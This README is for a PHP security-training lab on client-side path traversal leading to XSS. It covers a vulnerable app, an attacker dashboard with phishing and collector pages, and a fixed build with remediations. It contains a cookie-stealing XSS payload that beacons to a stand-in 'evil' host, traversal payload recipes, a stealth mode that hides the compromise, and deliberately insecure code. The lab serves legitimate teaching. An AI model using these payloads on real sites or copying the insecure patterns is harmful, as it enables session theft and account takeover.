# Client Side Path Traversal (CSPT → XSS) — Training Demo

A self-contained **PHP** lab for teaching developers **how Client Side Path
Traversal happens, what its impact is, and how to fix it**. Drop the files into
`/var/www/html` and Apache serves them on port 80 — no port conflicts, and it
already starts on boot.

> ⚠️ For authorized security training on an isolated machine only. The
> "attacker" app never touches any real system; it only talks to the
> deliberately vulnerable demo app.

```
Client Side Path Traversal/
├── vulnerable-app/     index.php  api.php
├── hacker-app/         index.php  phish.php  collect.php  loot.php  clear.php
├── secure-app/         index.php  api.php
└── README.md
```

The two apps are meant to run on **two different machines** (a "victim/app"
server and an "attacker" server).

---

## 0. TL;DR — the whole attack in five lines

1. The victim page fetches data by **glueing a URL string together** from a
   parameter you control: `fetch('api.php/documents/' + docId)`.
2. You set `docId` to `../preview/<payload>`. The **browser** rewrites
   `documents/../preview/…` into `preview/…` *before sending the request*.
3. `/preview/` is a **same-origin endpoint that echoes back whatever you send
   it** as HTML — so the response now contains *your* HTML.
4. The page drops that response into `innerHTML`, which **executes** it — as
   JavaScript, inside the victim's logged-in session.
5. Your script reads the victim's secret document + session cookie and beacons
   them to your server. Full account takeover, and the malicious URL never once
   mentioned `evil.com`.

Everything below explains *why each of those steps works* — especially the two
things that confuse people first: **"where is the `/preview/` folder?"** (there
isn't one) and **"why is the payload base64?"**.

---

## 1. Deploy on Kali (PHP + Apache)

### One-time setup (on each machine)

Kali has Apache; make sure PHP is installed and Apache is running:

```bash
sudo apt update && sudo apt install -y apache2 php libapache2-mod-php
sudo systemctl enable --now apache2
```

### Get the files

```bash
git clone https://github.com/<your-username>/safevault-cspt-lab.git
cd safevault-cspt-lab
```

### Copy the files

`/var/www/html` usually contains a default `index.html` — remove it first so
the app's `index.php` is served.

```bash
# ---- on the VULNERABLE / app server ----
sudo rm -f /var/www/html/index.html
sudo cp vulnerable-app/index.php vulnerable-app/api.php /var/www/html/

# ---- on the ATTACKER server ----
sudo rm -f /var/www/html/index.html
sudo cp hacker-app/index.php hacker-app/phish.php hacker-app/collect.php \
        hacker-app/loot.php hacker-app/clear.php /var/www/html/

# ---- OPTIONAL: the SECURED build, alongside the vulnerable one ----
# served at  http://<vuln-ip>/secure/
sudo mkdir -p /var/www/html/secure
sudo cp secure-app/index.php secure-app/api.php /var/www/html/secure/
```

That's it — the apps are live and keep running across reboots (Apache is
already a boot service). Open them at:

| App | URL |
|-----|-----|
| SafeVault (vulnerable) | `http://<vuln-ip>/` |
| EvilCorp C2 (attacker) | `http://<attacker-ip>/` |
| SafeVault (secured, optional) | `http://<vuln-ip>/secure/` |

> **If the document area shows an error / the API 404s:** the API routes via
> `PATH_INFO` (e.g. `api.php/documents/secret`), which Kali's default `mod_php`
> supports out of the box. If your Apache was changed to reject it, re-enable
> with `AcceptPathInfo On` (in the site/directory config) and
> `sudo systemctl reload apache2`. Also make sure PHP is actually enabled
> (`php -v` works and `sudo a2query -m php*` shows the module) — otherwise
> Apache serves the `.php` source as text.

---

## 2. Run the demo (≈2 minutes)

> **Demo credentials** (the login page no longer prints these):
>
> | Username | Password |
> |----------|----------|
> | `victim` | `victim` |
> | `hacker` | `hacker` |
>
> Both work on the vulnerable app and the secured build. Use `victim` for the
> victim role; `hacker` is a spare account for the attacker to log in and poke
> at the target. After login the header shows **who** is signed in, and each
> account holds **different** confidential data (the victim's corporate secrets
> vs. the hacker's own C2 credentials) — so the loot the attack exfiltrates is
> unmistakably the *victim's* data, taken through the victim's session.

1. **Be the victim.** Open the vulnerable server (`http://<vuln-ip>/`) and
   **Sign in** as `victim` / `victim`. You now have a session cookie. Click
   around — the **Confidential** document holds an API key, admin password,
   etc. (The **Sign out** button in the header ends the session for another
   run-through.)

2. **Be the attacker.** Open the C2 dashboard (`http://<attacker-ip>/`), set
   **Target** to the vulnerable server's address, choose an **Attack scenario**
   (Scenario 1 = Documents, the default; Scenario 2 = the harder Secure-Notes →
   SSH-key variant, see §5), pick an **After exploitation** behaviour, and click
   **Generate payload & phishing link**. It shows the injected JavaScript and the
   malicious link (a normal-looking SafeVault URL).

   The **After exploitation** dropdown controls what the victim sees once the
   payload runs — the exfiltration happens the same way either way:
   - **Stealth** (default) — steals the data silently and then redirects the
     victim to a normal document. The victim sees a working SafeVault page and
     suspects nothing; this is how a real attack behaves.
   - **Deface** — drops a full-screen red "Account compromised" overlay. Use it
     in a classroom to *prove* the attacker's JS executed in the victim session.

3. **Deliver the lure.** Click **Open the phishing page →** — the page you'd
   email a victim ("Alice shared a document with you"). Click **Open
   document →**.

4. **Watch it fire.** The victim's browser lands on SafeVault and the CSPT
   payload runs:
   - in **Stealth** mode the page briefly loads and then quietly shows a normal
     document — no visible sign of compromise;
   - in **Deface** mode the page is **visibly defaced** with an "Account
     compromised" overlay showing the stolen cookie and confidential document;
   - either way, the C2 dashboard's **Stolen data (live)** table fills in with
     the cookie and data, exfiltrated to the attacker's server.

> Do steps 1–4 in the **same browser** so the victim session cookie is present
> when the payload runs. That is the whole point: the attack rides the victim's
> existing login.

### Troubleshooting: nothing lands in the loot table

The stolen data is beaconed to the **Collector URL**, which the C2 dashboard
auto-fills from *its own address*. If you opened the C2 at `http://localhost`
but the victim reaches the attacker box at its LAN IP, the beacon points at the
wrong host and never arrives.

**Fix:** open the C2 dashboard using the attacker machine's real address
(e.g. `http://192.168.1.185/`) *before* clicking **Generate**, or set the
**Collector URL** field to the attacker machine's reachable address and
regenerate. The on-victim defacement overlay works regardless, so if you see
the overlay but no loot row, it's always a collector-address mismatch.

### Troubleshooting: the payload injects but nothing happens (no overlay, no loot)

If the document card shows a **broken-image icon but no red overlay**, the
`<img onerror>` fired but the exfil `fetch()` to the **steal endpoint** was
rejected — most often because that endpoint resolved to a *different origin*
than the page the victim is on (IP vs hostname, a port difference, `http` vs
`https`), so the browser's same-origin policy blocked it.

**Fix:** leave the **Endpoint to steal** field as the **relative** default
(`/api.php/documents/secret` for Scenario 1, `/api.php/notes/ssh.json` for
Scenario 2). A relative path is always same-origin with the victim page, so it
never hits CORS. Also make sure the C2 **Target** is the *same address the
victim actually browses* (all `192.168.1.185`, not a mix of IP and hostname).
The payload also has a `catch` so a failed document fetch still defaces the page
and beacons the cookie (the data column shows
`[document fetch failed - cookie still stolen]`) — so a truly silent "nothing
happened" now means the injection itself didn't land, not the exfil.

---

## 3. The one idea that unlocks everything: **virtual paths**

New learners get stuck here, so read this section slowly. It answers the
question: *"The exploit uses `api.php/preview/…`, but there is no `preview`
folder anywhere in the project — how can it exist?"*

**It exists because `/preview/` is not a folder. It is a route matched by code
inside `api.php`.**

### A URL path is not a file path

We are used to URLs mapping to files: `/images/logo.png` → the file
`images/logo.png` on disk. But that is only one way servers work. Modern apps
use a **front controller**: one script receives *every* request and decides
what to do by looking at the leftover URL text. That leftover text is called
**`PATH_INFO`**.

When the browser asks for:

```
GET /api.php/preview/SGVsbG8
        │        └──────────────►  PHP puts this in  $_SERVER['PATH_INFO']  =  "/preview/SGVsbG8"
        └───────────────────────►  the real file Apache runs is  api.php
```

Apache runs the real file `api.php`. Everything after `.php` is **not looked up
on disk** — it is just a string handed to the script. `api.php` reads it on
line 23:

```php
$pi = $_SERVER['PATH_INFO'] ?? '';   // e.g. "/documents/secret" or "/preview/<b64>"
```

…and then decides what to do with `preg_match` (regular expressions). Every
"route" in this lab is just an `if` with a regex:

```php
// api.php:135  — "if PATH_INFO looks like /preview/SOMETHING, reflect it"
if (preg_match('#^/preview/(.+)$#', $pi, $m)) {
    $html = base64_decode(...);              // decode what the attacker sent
    echo json_encode(['title'=>'Preview', 'body'=>$html]);   // and echo it back
    exit;
}
```

So `/documents/`, `/preview/`, `/notes/`, `/render/` are **all invented names
that live only as regex patterns in code.** None of them are directories. This
is exactly how Laravel, Express, Flask, Rails, ASP.NET, etc. route too — the URL
almost never maps to a real folder. That is why you can search the whole project
and never find `preview/`: **there is nothing to find.**

### So what does "path traversal" traverse, if not folders?

This is the second half of the insight. The `../` in the payload does **not**
walk directories on a disk. It rewrites the **URL path string, inside the
browser, before any request is sent.**

Watch it happen step by step:

```
1. JS concatenates:      "api.php/documents/"  +  "../preview/SGVsbG8"
                          = "api.php/documents/../preview/SGVsbG8"

2. The browser's URL parser normalises "../"  (same rule it uses for <a href>):
   the ".." cancels the "documents" segment  →

                          = "api.php/preview/SGVsbG8"

3. THAT normalised URL is what actually goes on the wire.

4. Apache runs api.php, PATH_INFO = "/preview/SGVsbG8", the /preview/ regex
   matches, and the attacker's HTML is reflected back.
```

The word "path" here means the **URL path** (a routing string), not a
filesystem path. The traversal moves you **from one route to another route on
the same server** — which is precisely why it is called *Client*-Side Path
Traversal: the traversal is resolved by the **client (the browser)**, not the
server.

### Client-side vs classic (server-side) path traversal

|                         | Server-side path traversal | **Client-side** path traversal (this lab) |
|-------------------------|----------------------------|-------------------------------------------|
| What `../` walks        | Real folders on disk       | URL path segments / routes                |
| Who resolves the `../`  | The server's file API      | **The browser's URL normaliser**          |
| Classic target          | `../../etc/passwd`         | A different **same-origin route**          |
| Needs a real folder?    | Yes                        | **No** — routes are matched in code        |
| Typical impact          | Read arbitrary files       | XSS / call unintended API in victim session |

---

## 4. The second thing people ask: **why is the payload base64?**

The payload we want to deliver is HTML/JS, e.g.:

```html
<img src=x onerror="fetch('http://evil/collect?c='+document.cookie)">
```

That string has to survive being carried **inside a URL path segment**. The
problem: several characters in it are *hostile to URL paths* and would destroy
the attack before it starts.

| Character in the payload | What the URL machinery does to it |
|--------------------------|-----------------------------------|
| `/` (e.g. in `</script>` or `http://`) | Starts a **new path segment** — breaks your structure and interferes with the `../` normalisation. |
| `.` and `..` | The browser's normaliser **collapses** `./` and `../` — your payload gets mangled. |
| `?` | Ends the path and starts the **query string** — chops the payload off. |
| `#` | Starts the **fragment** — also chops the payload off. |
| space, `<`, `>`, `"`, `'` | Not allowed raw in a URL; get mangled or encoded inconsistently. |

**Base64url** (the URL-safe variant, alphabet `A–Z a–z 0–9 - _`, no `=`
padding) turns arbitrary HTML into a string containing **none** of those
dangerous characters — crucially **no `.` and no `/`**. So the browser's
normaliser leaves it completely untouched, and the server decodes it back
(`api.php:137-139`):

```php
$b64 = strtr($m[1], '-_', '+/');          // base64url  ->  standard base64
$pad = strlen($b64) % 4;                    // restore the "=" padding we dropped
if ($pad) { $b64 .= str_repeat('=', 4-$pad); }
$html = base64_decode($b64);                // back to the raw HTML payload
```

### "Can I just *not* encode it?"

Only for a toy payload that happens to contain no `/ . ? # < >` or spaces —
which real HTML/JS never satisfies. In practice, **no**.

### "Then can I URL-encode (`%2F`, `%2E`) instead of base64?"

**No, and this is the subtle part worth understanding.** The danger is
**normalisation, which happens *after* decoding**. The browser turns
`%2E%2E%2F` back into `../` and *then* the normaliser collapses it. Percent-
encoding a `.` or `/` does not hide it from the normaliser — the standard order
is decode-then-normalise. Base64 wins because it removes the dangerous
characters *entirely*, so there is nothing left for the normaliser to act on.

There is also a **second, lab-specific reason** base64 is mandatory in
Scenario 2: the `/render/` route uses **strict** base64 decoding
(`base64_decode($b64, true)`, `api.php:177`). The payload therefore *must* be
valid base64 — which is exactly the constraint that makes the `.json`-suffix
puzzle in §5 interesting.

> **Rule of thumb:** base64url here is a **transport encoding to survive URL
> path normalisation**, not obfuscation or "hacker magic." It is the reliable
> way to smuggle arbitrary bytes through a URL path segment intact.

---

## 5. Two scenarios, side by side

### Scenario 1 — Documents (the straightforward case)

The vulnerable viewer (`vulnerable-app/index.php:217`):

```js
var docId = params.get('doc') || '1';          // attacker-controlled
fetch('api.php/documents/' + docId, {credentials:'same-origin'})  // ❌ concatenated, unvalidated
  .then(r => r.json())
  .then(doc => body.innerHTML = doc.body);      // ❌ dangerous HTML sink
```

Attack link: `?doc=../preview/<b64>` → normalises to `api.php/preview/<b64>` →
reflected HTML → `innerHTML` executes it.

### Scenario 2 — Secure Notes → SSH key (a fixed suffix in the way)

The notes viewer **always appends `.json`** (`vulnerable-app/index.php:210`):

```js
var noteId = params.get('note');                          // attacker-controlled
fetch('api.php/notes/' + noteId + '.json', {...})         // ❌ concatenated AND ".json" appended
  .then(r => r.json()).then(doc => body.innerHTML = doc.body);
```

The reflecting endpoint `/render/` uses **strict** base64 decode, so the naïve
payload fails:

```
?note=../render/<b64>    →   GET api.php/render/<b64>.json
                             strict decode sees the "." → returns FALSE → no XSS ✗
```

The trick is to **shed the appended suffix** by ending the payload with `?`
(or `#`), pushing `.json` into the *query string* where it no longer touches the
path:

```
?note=../render/<b64>?   →   GET api.php/render/<b64>   +   QUERY_STRING=".json"
                             clean path → strict decode succeeds → XSS fires ✓
```

The C2 dashboard builds this automatically for Scenario 2. The stolen asset is a
**production SSH private key** at `api.php/notes/ssh.json`, read with the
victim's session. **Lesson:** real CSPT targets often glue a fixed prefix/suffix
onto your input; recognising that a trailing `?`/`#` can neutralise a suffix is
a core exploitation skill.

---

## 6. Exactly which parts are insecure

Four independent mistakes stack up. **Any single one of them, removed, breaks
the attack** — which is also why the fix (§7) applies all four (defense in
depth).

| # | Insecure thing | Where | Why it's exploitable |
|---|----------------|-------|----------------------|
| 1 | **String-concatenating** untrusted input into a request path | `index.php:210,217` — `'api.php/documents/' + docId` | Lets `../` in the input re-target the request to another route. |
| 2 | **No validation / allowlist** on `docId` / `noteId` (client *and* server) | `index.php` (none); `api.php:116,149` accept `(.+)` | A value like `../preview/<b64>` sails straight through. |
| 3 | **Dangerous sink**: response rendered as **HTML** | `index.php:192` — `body.innerHTML = doc.body` | Turns reflected text into **executing** markup/script. |
| 4 | **A reflecting endpoint exists** + **script-readable session cookie** | `api.php:135` (`/preview`), `:173` (`/render`); cookie `httponly=false` at `index.php:19` | Gives the attacker a same-origin HTML mirror, and lets stolen `document.cookie` be a full login. |

Two supporting design choices make the *impact* maximal (they are intentional,
to make the lesson land):

- **Identity = session id alone.** The username lives in `$_SESSION`
  (`api.php:21`), looked up by the session id. So a stolen `session` cookie *is*
  the account — paste it into another browser (DevTools → Application → Cookies)
  and you're logged in as the victim, no password.
- **The malicious URL is 100% same-origin.** It never contains `evil.com`. The
  request is redirected *within the app* by traversal — which is why URL/host
  allowlists and CSP `connect-src` alone **do not** stop it.

---

## 7. How we fixed it — `secure-app`

Point the C2's **Target** at the secured build (`http://<vuln-ip>/secure/`),
regenerate, and try the link — nothing happens. Each fix below maps directly to
one insecure item in §6.

| Fix | Defeats §6 item | Code (in `secure-app/`) |
|-----|-----------------|--------------------------|
| **1. Encode the segment** so `/` and `.` can't traverse | #1 | `fetch('api.php/documents/' + encodeURIComponent(docId))` — `index.php:164` |
| **2. Allowlist the id**, on client **and** server | #2 | `/^[A-Za-z0-9_-]+$/.test(docId)` — `index.php:161`; server `preg_match('/^[A-Za-z0-9_-]+$/', $id)` — `api.php:73,97` |
| **3. Use a safe sink** — render as text, not markup | #3 | `el.textContent = doc.body` (never `innerHTML`) — `index.php:136` |
| **4. Remove the reflector + harden the cookie** | #4 | **No** `/preview` or `/render` route — `api.php:111`; cookie `httponly=true, samesite=Strict` — `index.php:18` |

Why each one alone is enough:

- **Encoding** turns `../preview/<b64>` into `..%2Fpreview%2F<b64>` — the `/` is
  now literal text, so there's no second segment to traverse into. The request
  stays `api.php/documents/..%2Fpreview…`, hits the documents route, and 404s.
- **Allowlisting** rejects the id the moment it contains `/`, `.`, etc. — the
  payload never leaves the page (client) and is refused by the API (server). The
  server check matters because an attacker can call the API directly, bypassing
  your JS.
- **`textContent`** writes the response as literal characters. Even if attacker
  HTML somehow arrived, the browser shows `<img onerror=…>` as *text* — it never
  becomes a DOM node, so nothing executes.
- **No reflecting endpoint** means even a perfect traversal has nowhere to land;
  and an **HttpOnly** cookie can't be read by `document.cookie`, so even a
  successful XSS can't steal the session. `SameSite=Strict` additionally stops
  the cookie riding along on cross-site navigations.

The **same four fixes cover Scenario 2** — the `?`/`#` suffix trick buys
nothing once the note id is allowlisted and encoded, and the secured API has no
`/render` at all.

> **General rule:** never build a request path by string-concatenating
> untrusted input. Treat every dynamic path segment as data that must be
> **encoded** and **validated against an allowlist**, and keep untrusted content
> away from HTML sinks (`innerHTML`, `outerHTML`, `document.write`,
> `insertAdjacentHTML`).

---

## 8. Quick reference — payload anatomy

```
        ┌── escapes the /documents/ segment (browser normalises this away)
        │      ┌── the real same-origin route we want to hit (a reflector)
        │      │        ┌── our HTML/JS, base64url-encoded so no "." or "/" survives
        │      │        │                                   ┌── (Scenario 2 only)
        ▼      ▼        ▼                                   ▼   sheds the appended ".json"
?doc=  ../  preview/  PGltZyBzcmM9eCBvbmVycm9yPS4uLj4          ?
       └──────────────── all of this is the value of ?doc= or ?note= ─────────────┘
```

- Scenario 1: `?doc=../preview/<b64>`
- Scenario 2: `?note=../render/<b64>?`  (trailing `?` pushes `.json` into the query string)

---

## 9. Reset

- **Sign out** in the app, or clear cookies, to reset a victim session.
- Clear captured data with the **Clear loot** button on the C2 dashboard (the
  loot table auto-refreshes every 5s). It persists in a file on the attacker
  box, so you can also delete it directly: `sudo rm -f /tmp/evilcorp_loot.json`.

---

## 10. Security notes for this lab

- Login uses **PHP sessions**: the `session` cookie is a session id and the
  username is stored server-side (`$_SESSION`), so the id alone identifies the
  user. The vulnerable app's session cookie is intentionally **not** HttpOnly so
  the attack can steal a *real, usable* session id via `document.cookie`; the
  secured build makes it HttpOnly + `SameSite=Strict`. All confidential data is
  fake — keep this lab off any production/shared host.
- Serve it only on an isolated training network.

> **If login doesn't "stick"** (you sign in but land back on the login page),
> PHP can't write its session files — make the session save path writable
> (`/var/lib/php/sessions` is correct out of the box on Kali/Apache).

Reference: PayloadsAllTheThings —
<https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Client%20Side%20Path%20Traversal>

---

## 11. License & responsible use

Released under the [MIT License](LICENSE).

This project is an intentionally **vulnerable** application built solely for
education and authorized security testing. Run it only on machines and networks
you own or are explicitly permitted to test. Do **not** deploy it on the public
internet or any shared/production host, and never use these techniques against
systems without written authorization. You are responsible for how you use it.
